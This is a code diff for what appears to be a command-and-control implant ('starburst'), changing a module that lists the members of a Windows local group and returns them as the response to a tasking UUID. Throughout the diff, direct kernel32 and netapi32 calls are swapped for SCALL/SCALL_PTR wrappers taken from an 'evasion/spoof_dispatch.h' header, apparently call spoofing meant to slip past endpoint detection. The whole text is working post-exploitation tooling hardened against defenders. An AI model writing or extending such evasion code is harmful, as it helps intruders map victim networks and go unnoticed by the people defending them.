@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_NET_LOCALGROUP_MEMBER
 
@@ -24,7 +25,7 @@ auto declfn starburst::cmd_net_localgroup_member(
     _In_    Parser*   params
 ) -> void {
     STK_NETAPI32(_n);
-    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_netapi = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
@@ -59,20 +60,20 @@ auto declfn starburst::cmd_net_localgroup_member(
     if ( host_str && host_len > 0 ) {
         char host_buf[256] = { 0 };
         memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
-        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
+        SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, host_buf, -1, w_host, 256 );
         p_host = w_host;
     }
 
     char group_buf[256] = { 0 };
     memory::copy( group_buf, group_str, group_len < 255 ? group_len : 255 );
     wchar_t w_group[256] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, group_buf, -1, w_group, 256 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, group_buf, -1, w_group, 256 );
 
     LPBYTE buf = nullptr;
     DWORD entries_read = 0, total_entries = 0;
     DWORD_PTR resume = 0;
 
-    DWORD status = pGetMembers(
+    DWORD status = (DWORD)SCALL_PTR( inst, pGetMembers,
         p_host, w_group, 3, &buf, 0xFFFFFFFF,
         &entries_read, &total_entries, &resume );
 
@@ -85,7 +86,7 @@ auto declfn starburst::cmd_net_localgroup_member(
     uint32_t out_cap = 8192;
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
     if ( !output ) {
-        pFree( buf );
+        SCALL_PTR( inst, pFree, buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -103,7 +104,7 @@ auto declfn starburst::cmd_net_localgroup_member(
     auto members = reinterpret_cast<LOCALGROUP_MEMBERS_INFO_3*>( buf );
     for ( DWORD i = 0; i < entries_read && off + 300 < out_cap; i++ ) {
         char name[260] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, members[i].lgrmi3_domainandname, -1, name, 260, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, members[i].lgrmi3_domainandname, -1, name, 260, nullptr, nullptr );
         uint32_t nlen = str_len( name );
 
         str_copy( output + off, symbol<char*>( const_cast<char*>( "  " ) ) );
@@ -114,7 +115,7 @@ auto declfn starburst::cmd_net_localgroup_member(
     }
 
     output[off] = '\0';
-    pFree( buf );
+    SCALL_PTR( inst, pFree, buf );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
 }
